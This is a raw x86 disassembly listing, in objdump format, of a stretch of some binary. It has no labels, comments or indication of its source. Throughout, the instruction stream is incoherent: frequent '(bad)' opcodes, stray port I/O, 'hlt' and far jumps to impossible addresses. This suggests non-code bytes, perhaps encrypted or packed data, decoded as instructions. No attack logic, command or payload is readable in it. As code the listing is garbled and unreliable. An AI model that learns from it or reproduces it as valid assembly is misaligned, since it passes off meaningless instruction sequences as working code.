  433e21:	call   0xc76c751
  433e26:	mov    DWORD PTR [ebp+0x10],ecx
  433e29:	(bad)  
  433e2a:	push   0x8b85ff10
  433e2f:	clc    
  433e30:	or     al,0x51
  433e32:	(bad)  
  433e33:	push   ecx
  433e34:	retf   
  433e35:	mov    ebx,0xff4d8dc8
  433e3a:	mov    DWORD PTR [ebp+0x8],eax
  433e3d:	xor    eax,DWORD PTR [ebp-0x75]
  433e40:	cmp    ebp,DWORD PTR [ebx]
  433e42:	lsl    ebx,WORD PTR [edi-0x8]
  433e46:	call   DWORD PTR [ebx-0x741bff75]
  433e4c:	(bad)  
  433e4d:	or     al,0x5b
  433e4f:	dec    ebp
  433e50:	or     BYTE PTR [ebx],dh
  433e52:	inc    ebp
  433e53:	xor    esi,DWORD PTR ds:0x708088d
  433e59:	in     eax,0x99
  433e5b:	add    BYTE PTR [edx],dh
  433e5d:	inc    ebp
  433e5e:	pop    edi
  433e5f:	xor    eax,edx
  433e61:	test   DWORD PTR [eax],0x81108b8b
  433e67:	dec    ebp
  433e68:	sub    al,0x33
  433e6a:	add    BYTE PTR [ebx],dh
  433e6c:	push   esi
  433e6d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  433e73:	mov    edi,eax
  433e75:	or     BYTE PTR [ebp+0x45],al
  433e78:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  433e7e:	ss leave 
  433e80:	pushf  
  433e81:	push   es
  433e82:	mov    DWORD PTR [esp+edi*8+0x3a],0x4df81785
  433e8a:	inc    ebp
  433e8b:	cmp    BYTE PTR [esi],0x51
  433e8e:	pushf  
  433e8f:	addr16 (bad) 
  433e91:	shl    esp,1
  433e93:	dec    ebp
  433e94:	xchg   BYTE PTR [eax-0x3dbaae08],al
  433e9a:	(bad)  
  433e9b:	jmp    0x8c0b1177
  433ea0:	aam    0x8
  433ea2:	test   DWORD PTR [ebp-0x8],ecx
  433ea5:	mov    BYTE PTR [ebp-0x75],al
  433ea8:	or     BYTE PTR [eax],cl
  433eaa:	add    BYTE PTR [ebp-0x75],dl
  433ead:	mov    eax,0xfc728b
  433eb2:	dec    ebp
  433eb3:	enter  0xceba,0x8
  433eb7:	retf   0x1807
  433eba:	ret    0x994d
  433ebd:	mov    esi,DWORD PTR [edx]
  433ebf:	or     al,0x33
  433ec1:	into   
  433ec2:	add    edx,esi
  433ec4:	add    ecx,edx
  433ec6:	bswap  eax
  433ec8:	ror    esi,0x98
  433ecb:	dec    ebp
  433ecc:	add    cl,ch
  433ece:	mov    edi,edi
  433ed0:	hlt    
  433ed1:	inc    esi
  433ed3:	inc    ebp
  433ed4:	ret    0x4533
  433ed7:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  433edd:	or     BYTE PTR [ebx],dh
  433edf:	dec    ebp
  433ee0:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433ee6:	jne    0xff8d3ead
  433eec:	inc    ebp
  433eed:	inc    ebp
  433eee:	mov    esi,DWORD PTR [ebx]
  433ef0:	clc    
  433ef1:	pop    esi
  433ef2:	ret    0xcaeb
  433ef5:	mov    eax,esi
  433ef7:	call   0x520490ca
  433efc:	dec    ebp
  433efd:	add    eax,0xf8728b
  433f02:	adc    eax,0xce0ccac9
  433f07:	push   ebp
  433f08:	ret    0xc6ec
  433f0b:	in     al,dx
  433f0c:	call   0x33438c15
  433f11:	push   edi
  433f12:	add    edi,eax
  433f14:	xor    eax,eax
  433f16:	jmp    0x433f5d
  433f18:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  433f1e:	add    eax,edi
  433f20:	shr    eax,cl
  433f22:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433f28:	mov    edi,DWORD PTR [ecx]
  433f2a:	in     al,dx
  433f2b:	pushf  
  433f2c:	ret    0x84c7
  433f2f:	fcomp  DWORD PTR [ecx-0x7607cd7b]
  433f35:	inc    ebp
  433f36:	in     al,dx
  433f37:	ss inc ebp
  433f39:	pushf  
  433f3a:	mov    eax,edi
  433f3c:	cld    
  433f3d:	fmul   st(2),st
  433f3f:	sbb    dl,al
  433f41:	jmp    0x9c3b:0x374d45c1
  433f48:	jbe    0x433f11
  433f4a:	mov    esp,eax
  433f4c:	clc    
  433f4d:	add    BYTE PTR [ebp+0x0],cl
  433f50:	mov    ecx,ecx
  433f52:	lea    eax,[ebp-0x5]
  433f55:	mov    edi,edi
  433f57:	call   0x51ce90a1
  433f5c:	hlt    
  433f5d:	xor    eax,edx
  433f5f:	mov    esi,0x997284
  433f64:	xor    cl,dl
  433f66:	mov    esi,eax
  433f68:	hlt    
  433f69:	into   
  433f6a:	inc    ebp
  433f6b:	scas   eax,DWORD PTR es:[edi]
  433f6c:	mov    ebp,ecx
  433f6e:	cld    
  433f6f:	add    dl,cl
  433f71:	add    dl,al
  433f73:	inc    ebp
  433f74:	shr    DWORD PTR [ebx],0x4d
  433f77:	xor    edi,DWORD PTR [ebx]
  433f79:	mov    DWORD PTR [edi],ecx
  433f7b:	clc    
  433f7c:	dec    esi
  433f7d:	inc    ebp
  433f7e:	dec    DWORD PTR [ebx-0x3d2b1775]
  433f84:	ret    0xc6ca
  433f87:	mov    BYTE PTR [ebp-0x32],0x53
  433f8b:	scas   eax,DWORD PTR es:[edi]
  433f8c:	inc    ebp
  433f8d:	jmp    0x433fc6
  433f8f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433f96:	pop    ebx
  433f97:	xor    ecx,DWORD PTR [ebp+0x3]
  433f9a:	mov    eax,DWORD PTR [ebx]
  433f9c:	clc    
  433f9d:	test   edx,ecx
  433f9f:	mov    ecx,esi
  433fa1:	cld    
  433fa2:	call   0x8ab784ec
  433fa7:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433fad:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433fb3:	fdiv   QWORD PTR [ebx]
  433fb5:	retf   0xce89
  433fb8:	in     al,0xc1
  433fba:	inc    ebp
  433fbb:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433fc1:	into   
  433fc2:	mov    dh,0xc1
  433fc5:	call   0x8c17854e
  433fca:	(bad)  
  433fcb:	cld    
  433fcc:	mov    ecx,DWORD PTR [ebp-0x14]
  433fcf:	xor    eax,ecx
  433fd1:	lea    eax,[ebp+0x8]
  433fd4:	mov    esi,DWORD PTR [edx-0x4]
  433fd7:	add    dl,al
  433fd9:	inc    ebp
  433fda:	mov    esp,0x32d8998b
  433fdf:	dec    ebp
  433fe0:	mov    esi,DWORD PTR [ebx]
  433fe2:	cld    
  433fe3:	xor    eax,edx
  433fe5:	sub    esp,DWORD PTR [edi-0x75]
  433fe8:	int    0xec
  433fea:	sub    ecx,eax
  433fec:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  433ff2:	mov    esi,esp
  433ff4:	call   0x34178d7d
  433ff9:	inc    DWORD PTR [ebx]
  433ffb:	mov    edi,DWORD PTR [ebx]
  433ffd:	cld    
  433ffe:	jne    0x43404d
  434000:	mov    esi,DWORD PTR [ebx]
  434002:	aam    0x8d
  434004:	dec    ebp
  434005:	or     BYTE PTR [ebx],dh
  434007:	jb     0x43400c
  434009:	add    BYTE PTR [edi+0x45],bl
  43400c:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  434013:	xor    ebp,esp
  434015:	xor    eax,edi
  434017:	sub    edi,esp
  434019:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  43401f:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  434026:	inc    ebp
  434027:	xor    ecx,DWORD PTR [ecx+0x45891403]
  43402d:	clc    
  43402e:	mov    eax,edi
  434030:	nop
  434031:	fadd   QWORD PTR [eax]
  434033:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  434039:	jmp    0x433fc4
  43403b:	mov    eax,DWORD PTR [ecx]
  43403d:	fadd   DWORD PTR [eax]
  43403f:	inc    ebp
  434040:	or     DWORD PTR [ebx],esi
  434042:	dec    eax
  434043:	add    edx,DWORD PTR [ebx-0x2d]
  434046:	dec    ebp
  434047:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  43404d:	inc    ebp
  43404e:	push   ecx
  43404f:	mov    dl,BYTE PTR [ecx-0xd]
  434052:	xor    ecx,DWORD PTR [ebp-0x45]
  434055:	(bad)  
  434057:	rol    BYTE PTR [eax],0xc1
  43405a:	ret    
  43405b:	inc    ebp
  43405c:	inc    ebp
  43405d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  434063:	xor    eax,ebx
  434065:	add    eax,DWORD PTR [ebp+0x23]
  434068:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43406e:	cmp    edi,0xc
  434071:	dec    ebp
  434072:	inc    ebp
  434073:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  434079:	inc    ebp
  43407a:	mov    esi,DWORD PTR [ebx]
  43407c:	clc    
  43407d:	lea    eax,[ebp+0x45725407]
  434083:	add    BYTE PTR [ebp+eax*2-0x75],dh
  434087:	xor    edi,DWORD PTR [eax]
  434089:	mov    ecx,0xff8b8d4d
  43408e:	push   esp
  43408f:	enter  0x4df7,0x23
  434093:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  434099:	mov    eax,DWORD PTR [ebx]
  43409b:	loopne 0x434088
  43409d:	ret    0xc68b
  4340a0:	push   esp
  4340a1:	enter  0x9745,0x8b
  4340a5:	inc    ebp
  4340a6:	cld    
  4340a7:	mov    eax,edi
  4340a9:	clc    
  4340aa:	ret    
  4340ab:	ret    0xc645
  4340ae:	mov    esi,DWORD PTR [ebx]
  4340b0:	cld    
  4340b1:	pop    esi
  4340b2:	mov    ebx,0x83458bc3
  4340b8:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  4340bc:	dec    ebp
  4340bd:	xor    ebx,DWORD PTR ss:[ebx+eax*1-0x767a7646]
  4340c5:	clc    
  4340c6:	fcom   DWORD PTR [ebp+0x45]
  4340c9:	mov    edi,DWORD PTR [eax]
  4340cb:	adc    al,0x9c
  4340cd:	inc    ebp
  4340ce:	(bad)  
  4340cf:	mov    ebx,eax
  4340d1:	adc    al,0x85
  4340d3:	cmp    al,0x1
  4340d6:	inc    ebp
  4340d7:	add    BYTE PTR [edx],bh
  4340d9:	dec    ebp
  4340da:	pushf  
  4340db:	mov    ebp,ecx
  4340dd:	mov    eax,DWORD PTR [ebx]
  4340df:	nop
  4340e0:	add    BYTE PTR [eax],al
  4340e2:	inc    ebp
  4340e3:	mov    esi,DWORD PTR [ebx]
  4340e5:	add    eax,DWORD PTR [ebx]
  4340e7:	cmp    al,0x89
  4340e9:	mov    esp,esi
  4340eb:	clc    
  4340ec:	inc    ebp
  4340ed:	inc    ebp
  4340ee:	add    edx,DWORD PTR [esi+0xc]
  4340f1:	mov    edi,0x7ff0845
  4340f6:	in     al,dx
  4340f7:	(bad)  
  4340f8:	jne    0x434093
  4340fa:	mov    esi,DWORD PTR [edx]
  4340fc:	clc    
  4340fd:	add    ebp,DWORD PTR [esi]
  4340ff:	mov    edi,edi
  434101:	in     al,dx
  434102:	mov    DWORD PTR [ebp-0x10],eax
  434105:	xor    eax,DWORD PTR [ebp+0x3]
  434108:	mov    DWORD PTR ds:[esp+esi*8-0x7427ba75],ebx
  434110:	(bad)  
  434111:	push   eax
  434112:	ret    
  434113:	call   0xd4ffcaa5
  434118:	call   0xffcf3962
  43411d:	cmp    BYTE PTR [ebp+0x4d],al
  434120:	test   DWORD PTR [eax+0x74],ecx
  434123:	inc    ecx
  434124:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  43412a:	ret    
  43412b:	inc    eax
  43412c:	dec    DWORD PTR [ebx+0x4945f8f0]
  434132:	push   eax
  434133:	dec    eax
  434134:	test   al,0xd0
  434136:	dec    eax
  434138:	mov    eax,DWORD PTR [ebp-0x14]
  43413b:	mov    eax,DWORD PTR [ebp+0x38]
  43413e:	mov    eax,ecx
  434140:	fadd   DWORD PTR [ebx]
  434142:	dec    ebp
  434143:	inc    eax
  434144:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  43414a:	inc    ebp
  43414b:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  434151:	fadd   QWORD PTR [ebx]
  434153:	inc    ebp
  434154:	or     al,0x33
  434156:	dec    ebp
  434157:	add    edi,DWORD PTR [ebx]
  434159:	mov    DWORD PTR [edx-0x28],esi
  43415c:	mov    eax,DWORD PTR [ebp-0x10]
  43415f:	mov    eax,DWORD PTR [eax+0x10]
  434162:	mov    eax,edi
  434164:	lock ret 
  434166:	inc    ecx
  434167:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43416d:	fsubr  st,st(5)
  43416f:	test   DWORD PTR [eax],eax
  434171:	clc    
  434172:	push   0x45
  434174:	(bad)  
  434175:	cmp    ebp,esp
  434177:	pushf  
  434178:	inc    ebp
  434179:	(bad)  
  43417a:	push   eax
  43417b:	fsub   DWORD PTR [eax-0x7b]
  43417e:	(bad)  
  43417f:	clc    
  434180:	mov    eax,0xf8008584
  434185:	mov    eax,DWORD PTR [ebp-0x4]
  434188:	mov    edi,0x4585c3cc
  43418e:	clc    
  43418f:	mov    eax,DWORD PTR [ebp+0x14]
  434192:	cmp    BYTE PTR [ebp-0x64],al
  434195:	mov    edi,eax
  434197:	in     al,dx
  434198:	les    esi,FWORD PTR [ebp-0x7b]
  43419b:	mov    edi,eax
  43419d:	or     al,0x4d
  43419f:	dec    ebp
  4341a0:	mov    eax,ebp
  4341a2:	in     al,0xf2
  4341a4:	dec    ebp
  4341a5:	dec    DWORD PTR [ecx+0x4dc7e045]
  4341ab:	fmul   DWORD PTR [ecx+0x4df8f085]
  4341b1:	inc    ebp
  4341b2:	mov    DWORD PTR [ebx],esi
  4341b4:	fadd   QWORD PTR [ebx]
  4341b6:	dec    ebp
  4341b7:	push   eax
  4341b8:	xor    eax,DWORD PTR [ebp+0x3]
  4341bb:	push   eax
  4341bc:	mov    DWORD PTR [eax+ebx*8],ebx
  4341bf:	push   esi
  4341c1:	mov    eax,DWORD PTR [eax]
  4341c3:	lock cmp eax,0xf84e85c0
  4341c9:	inc    ebp
  4341ca:	test   BYTE PTR [ebx],dh
  4341cc:	add    DWORD PTR [ebx],eax
  4341ce:	add    BYTE PTR [eax+0x4d],dl
  4341d1:	jne    0x434206
  4341d3:	lea    ecx,[ebx-0x7617fc44]
  4341d9:	div    ah
  4341db:	inc    DWORD PTR [ebp+0x45]
  4341de:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  4341e4:	jb     0x434171
  4341e6:	add    BYTE PTR [eax*2-0x17ba743f],cl
  4341ed:	mov    ecx,DWORD PTR [ebp-0x10]
  4341f0:	xor    ecx,DWORD PTR [ebp+0x3]
  4341f3:	mov    edi,DWORD PTR [ebx]
  4341f5:	adc    BYTE PTR [ebp+0x41],dh
  4341f8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4341fe:	ret    
  4341ff:	push   ss
  434200:	push   0x45
  434202:	lea    ecx,[ebx+0x4de80cb0]
  434208:	sti    
  434209:	add    edi,edi
  43420b:	or     BYTE PTR [ebp+0x4d],al
  43420e:	mov    ebp,DWORD PTR [ebx]
  434210:	xor    ebp,ecx
  434212:	mov    al,BYTE PTR [edx]
  434214:	add    eax,0xc7200
  434219:	jne    0x434268
  43421b:	lea    esi,[ebx]
  43421d:	mov    al,0xf
  43421f:	call   0xf38e4
  434224:	shl    DWORD PTR [esi],0x84
  434227:	pushf  
  434228:	add    DWORD PTR [ecx+0x4545d000],ecx
  43422e:	mov    edi,DWORD PTR [ecx]
  434230:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  434237:	test   DWORD PTR [eax],eax
  434239:	clc    
  43423a:	dec    ebp
  43423b:	inc    ebp
  43423c:	xor    edi,DWORD PTR [ebx]
  43423e:	setl   al
  434241:	(bad)  
  434242:	retf   
  434243:	rol    cl,1
  434245:	dec    ebp
  434246:	test   BYTE PTR [ebp+0x4d00cc01],cl
  43424c:	inc    ebp
  43424d:	lea    ecx,[ebx-0x75b2cc38]
  434253:	lea    eax,ds:0x4d72c4
  434259:	mov    ecx,DWORD PTR [ebp-0x4]
  43425c:	xor    ecx,edi
  43425e:	bswap  ebx
  434260:	ror    BYTE PTR [ebp-0x35],0xe9
  434264:	rol    DWORD PTR [ecx],0x84
  434267:	add    BYTE PTR [ecx],al
  434269:	cmp    BYTE PTR [eax],al
  43426b:	pushf  
  43426c:	inc    ebp
  43426d:	jnp    0x8a437670
  434273:	mov    eax,DWORD PTR ds:0xcf72e8
  434279:	lock dec ebp
  43427b:	retf   
  43427c:	xor    ecx,DWORD PTR [ebp+0xf]
  43427f:	mov    eax,eax
  434281:	fmul   st,st(3)
  434283:	test   ecx,0x1998484
  434289:	xor    al,BYTE PTR [eax]
  43428b:	mov    DWORD PTR [ebp-0x28],eax
  43428e:	mov    eax,DWORD PTR [ebp+0x33]
  434291:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  434297:	ret    
  434298:	add    al,cl
  43429a:	dec    ebp
  43429b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4342a1:	add    ecx,DWORD PTR ds:0xc7250
  4342a7:	inc    ebp
  4342a8:	rcl    DWORD PTR [eax+0x4d],0x2b
  4342ac:	mov    edi,edi
  4342ae:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4342b4:	jb     0x43427d
  4342b6:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4342bd:	mov    esi,DWORD PTR [ebx]
  4342bf:	cld    
  4342c0:	mov    cl,bh
  4342c2:	or     eax,0x372b6
  4342c7:	cmp    ecx,eax
  4342c9:	jne    0x434346
  4342cf:	mov    eax,DWORD PTR [ebp-0x20]
  4342d2:	mov    eax,DWORD PTR [eax]
  4342d4:	xor    eax,edi
  4342d6:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4342dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4342e0:	mov    ecx,edi
  4342e2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4342e8:	jb     0x4342f9
  4342ea:	add    BYTE PTR [edi-0x3f],dl
  4342ed:	add    BYTE PTR [ebp-0x75],cl
  4342f0:	mov    esi,eax
  4342f2:	xor    eax,DWORD PTR [eax]
  4342f4:	mov    al,bh
  4342f6:	or     eax,0x497284
  4342fb:	xor    al,cl
  4342fd:	mov    ecx,DWORD PTR [ebp-0x4]
  434300:	mov    ecx,edi
  434302:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434308:	jb     0x434319
  43430a:	add    BYTE PTR [edi],dh
  43430c:	enter  0x8500,0x8b
  434310:	add    ah,bl
  434312:	add    BYTE PTR [eax],al
  434314:	inc    ebp
  434315:	(bad)  
  434316:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  43431d:	mov    esi,DWORD PTR [edx-0x4]
  434320:	add    bh,cl
  434322:	dec    ebp
  434323:	mov    dh,0x8b
  434325:	add    esi,DWORD PTR [ebx]
  434327:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43432d:	add    BYTE PTR [eax],al
  43432f:	mov    eax,ecx
  434331:	loopne 0x434380
  434333:	add    BYTE PTR [ebx-0x757bcc39],cl
  434339:	dec    ecx
  43433a:	or     eax,0x8b7232
  43433f:	in     al,0xc1
  434341:	or     DWORD PTR [ebp-0x31],ecx
  434344:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  43434b:	xor    dh,BYTE PTR [edx-0x75]
  43434e:	add    al,dh
  434350:	enter  0x4f09,0xcf
  434354:	inc    ebp
  434355:	mov    WORD PTR [ebx-0x75cdccb7],cs
  43435b:	or     al,BYTE PTR ds:0xe4728b
  434361:	or     DWORD PTR [ebp-0x31],ecx
  434364:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  43436b:	cmp    dh,BYTE PTR [edx+0xf]
  43436e:	add    bl,dl
  434370:	rol    DWORD PTR [eax],0x4d
  434373:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  434379:	(bad)  
  43437a:	or     eax,0x497284
  43437f:	xor    al,cl
  434381:	mov    ecx,DWORD PTR [ebp-0x20]
  434384:	mov    ecx,DWORD PTR [ecx]
  434386:	xor    ecx,edi
  434388:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  43438f:	xor    cl,al
  434391:	mov    ecx,DWORD PTR [edi]
  434393:	fadd   QWORD PTR [ebp+0x9]
  434396:	call   0xffd03e6a
  43439b:	dec    ecx
  43439c:	dec    ebp
  43439d:	xor    bh,BYTE PTR [ebx]
  43439f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4343a3:	loopne 0x4343a1
  4343a5:	or     edi,eax
  4343a7:	iret   
  4343a8:	ret    
  4343a9:	mov    WORD PTR [ebp+0x4d],es
  4343ac:	mov    esi,DWORD PTR [edx]
  4343ae:	call   0x84530aed
  4343b3:	(bad)  
  4343b4:	cdq    
  4343b5:	add    BYTE PTR [edx],dh
  4343b7:	mov    esi,DWORD PTR [ebx]
  4343b9:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4343bf:	test   BYTE PTR [ebx],dh
  4343c1:	dec    ecx
  4343c2:	add    esi,DWORD PTR [edx]
  4343c4:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4343ca:	dec    edi
  4343cc:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d49]
  4343d3:	xor    al,BYTE PTR [ebx]
  4343d5:	mov    edi,DWORD PTR [ebx]
  4343d7:	in     al,0x75
  4343d9:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4343df:	dec    ecx
  4343e0:	xor    esi,DWORD PTR [edx]
  4343e2:	lea    ecx,[edx]
  4343e4:	or     BYTE PTR [ebx+0x900f072],cl
  4343ea:	ja     0x4343bb
  4343ec:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b3],cl
  4343f3:	cmp    ch,al
  4343f5:	jne    0x4343ea
  4343f7:	mov    edi,edi
  4343f9:	fadd   QWORD PTR [ebp+0x0]
  4343fc:	mov    eax,edi
  4343fe:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb7]
  434405:	mov    edx,DWORD PTR [ebx]
  434407:	in     al,0x45
  434409:	or     DWORD PTR [ebx],esi
  43440b:	iret   
  43440c:	add    ecx,DWORD PTR [eax+edx*2+0x45321849]
  434413:	xor    dl,BYTE PTR [eax-0x75]
  434416:	sbb    al,0xe0
  434418:	dec    DWORD PTR [ecx]
  43441a:	mov    ecx,edi
  43441c:	in     al,dx
  43441d:	mov    eax,es
  43441f:	dec    ecx
  434420:	mov    DWORD PTR [edx],esi
  434422:	fmul   QWORD PTR [edx]
  434424:	jne    0x4343b1
  434426:	(bad)  
  434427:	(bad)  
  434429:	or     DWORD PTR [ebp-0x31],eax
  43442c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b3]
  434433:	cmp    bh,bh
  434435:	jne    0x43447c
  434437:	lea    ecx,[ebx-0x38372750]
  43443d:	inc    ebx
  43443f:	mov    eax,ecx
  434441:	mov    eax,0xa00c111
  434446:	jne    0x43448d
  434448:	mov    esi,DWORD PTR [ebx]
  43444a:	test   al,0x3
  43444c:	inc    ebp
  43444d:	mov    DWORD PTR [eax-0xc],edx
  434450:	loop   0x434497
  434452:	push   DWORD PTR [ebx]
  434454:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43445a:	add    DWORD PTR [eax],eax
  43445c:	mov    eax,edi
  43445e:	lods   al,BYTE PTR ds:[esi]
  43445f:	dec    ebp
  434460:	inc    ebp
  434461:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  434467:	retf   
  434468:	mov    edx,ecx
  43446a:	adc    al,0x84
  43446c:	(bad)  
  43446d:	std    
  43446e:	ret    
  43446f:	jmp    FWORD PTR [edi-0x2b7474bb]
  434475:	hlt    
  434476:	rol    edi,0x82
  434479:	ret    
  43447a:	cld    
  43447b:	enter  0x11ff,0x45
  43447f:	inc    ebp
  434480:	pop    edi
  434481:	mov    ebx,DWORD PTR [ebx+0x14]
  434484:	ret    0xc7
  434487:	test   BYTE PTR [ebx+0x45325199],cl
  43448d:	jmp    0x43441a
  43448f:	push   0x8
  434491:	call   DWORD PTR [esi]
  434493:	in     al,dx
  434494:	add    BYTE PTR [ebp+0x1],0x50
  434498:	add    bh,ah
  43449a:	add    bh,bh
  43449c:	icebp  
  43449d:	mov    ecx,DWORD PTR [eax]
  43449f:	cld    
  4344a0:	pop    es
  4344a1:	dec    ebp
  4344a2:	shl    DWORD PTR [ebx],0x72
  4344a5:	add    eax,DWORD PTR [eax]
  4344a7:	cmp    edx,ecx
  4344a9:	je     0x4344bb
  4344ab:	mov    esi,DWORD PTR [ebp-0x4]
  4344ae:	inc    edi
  4344b0:	or     al,0xc3
  4344b2:	jmp    FWORD PTR [edx-0x18]
  4344b5:	(bad)  
  4344b6:	sti    
  4344b7:	cwde   
  4344b8:	(bad)  
  4344b9:	call   0xffa13dc4
  4344be:	or     al,0x45
  4344c0:	push   ebp
  4344c1:	sub    esp,0x18
  4344c4:	push   ebx
  4344c5:	inc    ebp
  4344c6:	mov    edi,edi
  4344c8:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4344cf:	test   al,0x51
  4344d1:	inc    ebp
  4344d2:	push   ecx
  4344d3:	push   eax
  4344d4:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4344da:	add    ah,bh
  4344dc:	(bad)  
  4344dd:	dec    ebp
  4344de:	add    DWORD PTR [ebx],esi
  4344e0:	inc    ebp
  4344e1:	add    ecx,DWORD PTR [ebx+0x74943b]
  4344e7:	push   0xffffff8b
  4344e9:	dec    DWORD PTR [ebx-0x7fbaeb54]
  4344ef:	add    eax,DWORD PTR [ecx]
  4344f1:	or     BYTE PTR [eax],al
  4344f3:	call   0xff853cf8
  4344f8:	mov    eax,DWORD PTR [ebp+0x14]
  4344fb:	mov    ecx,DWORD PTR [ecx+0x801ac]
  434501:	inc    ebp
  434502:	dec    ecx
  434503:	add    ebp,DWORD PTR [edx+0x14]
  434506:	push   0x8b3045
  43450b:	call   0x33ad9280
  434510:	inc    DWORD PTR [ebx]
  434512:	mov    DWORD PTR [edi],ecx
  434514:	mov    eax,ecx
  434516:	or     BYTE PTR [ebp-0x3d],cl
  434519:	cmp    eax,edi
  43451b:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  434520:	adc    BYTE PTR [ebx+0x5eff0845],cl
  434526:	adc    al,0xc9
  434528:	inc    ebp
  434529:	adc    BYTE PTR [eax+0x55],dl
  43452c:	jne    0x43451a
  43452e:	call   0xff5444be
  434533:	dec    ebp
  434534:	inc    ebp
  434535:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43453b:	add    BYTE PTR [ebx],bh
  43453d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  434541:	push   ecx
  434542:	or     al,0x51
  434544:	dec    ebp
  434545:	xor    DWORD PTR [ebx],0xf320399
  43454b:	cmp    eax,DWORD PTR [ebp+0x74]
  43454e:	mov    edi,edi
  434550:	pop    edi
  434551:	adc    BYTE PTR [ebx+0x75],bl
  434554:	ret    0x50
  434557:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43455b:	(bad)  
  43455c:	clc    
  43455d:	mov    esp,ebp
  43455f:	pop    ecx
  434560:	mov    ecx,0xf80085c2
  434565:	mov    ecx,DWORD PTR [ecx+edx*2]
  434568:	push   esi
  434569:	push   esi
  43456a:	(bad)  
  43456b:	lock add eax,DWORD PTR [ebp+0x44]
  43456f:	mov    edx,DWORD PTR [eax]
  434571:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  434575:	or     BYTE PTR [ecx+0x7],dl
  434578:	push   ecx
  434579:	ret    
  43457a:	xor    ebx,DWORD PTR [ecx+0x37232be]
  434580:	add    BYTE PTR [ecx+0x147c8bfe],cl
  434586:	or     al,0x80
  434588:	jge    0x43458b
  43458a:	mov    DWORD PTR [eax],eax
  43458c:	and    al,0x8
  43458e:	cmp    DWORD PTR [ebp+0x10],eax
  434591:	mov    edx,DWORD PTR [esi]
  434593:	xchg   esp,eax
  434594:	dec    esp
  434595:	add    BYTE PTR [eax],dl
  434597:	mov    ecx,edx
  434599:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43459d:	dec    ebp
  43459e:	into   
  43459f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4345a5:	mov    edx,DWORD PTR [eax+0x14]
  4345a8:	das    
  4345a9:	add    al,0x45
  4345ab:	add    BYTE PTR [ebp+0x0],dh
  4345ae:	mov    edi,edi
  4345b0:	and    al,0x50
  4345b2:	mov    eax,DWORD PTR [eax]
  4345b4:	and    al,0xd1
  4345b6:	xor    eax,DWORD PTR [esi]
  4345b8:	lea    eax,[ebp+0x8]
  4345bb:	xor    esi,DWORD PTR [edx+0x3]
  4345be:	add    BYTE PTR [ecx+0x4510fc44],cl
  4345c4:	cmp    BYTE PTR [ebx+0x75eb0c9c],cl
  4345ca:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4345d4:	cmp    edi,edi
  4345d6:	pushf  
  4345d7:	mov    edi,edi
  4345d9:	or     BYTE PTR [esi+ecx*1],cl
  4345dc:	jne    0x4345a1
  4345de:	call   0xc45aa
  4345e3:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4345e7:	mov    ebx,DWORD PTR [eax]
  4345e9:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  4345ed:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4345f5:	pop    esi
  4345f6:	(bad)  
  4345f7:	leave  
  4345f8:	call   DWORD PTR [eax]
  4345fa:	call   DWORD PTR [ebp+0x24]
  4345fd:	in     al,dx
  4345fe:	jmp    esp
  434600:	and    al,0x83
